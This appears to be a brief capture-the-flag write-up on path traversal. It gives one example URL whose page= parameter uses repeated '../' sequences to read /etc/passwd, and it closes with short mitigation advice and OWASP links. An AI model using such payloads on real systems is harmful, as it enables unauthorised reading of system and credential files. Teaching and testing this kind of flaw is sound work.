# PATH_TRAVERSAL

In some url we can see a page= variable in GET request.
If we try to access the root directory we can find the flag in etc/passwd
```
http://x.x.x.x/index.php?page=../../../../../../../etc/passwd
```
Avoid using passing user-supplies input in file system calls
If forced to use user input for file operations, normalize the input before using, such as normalize().

```
https://wiki.owasp.org/index.php/Path_Traversal
https://owasp.org/www-community/attacks/Path_Traversal
```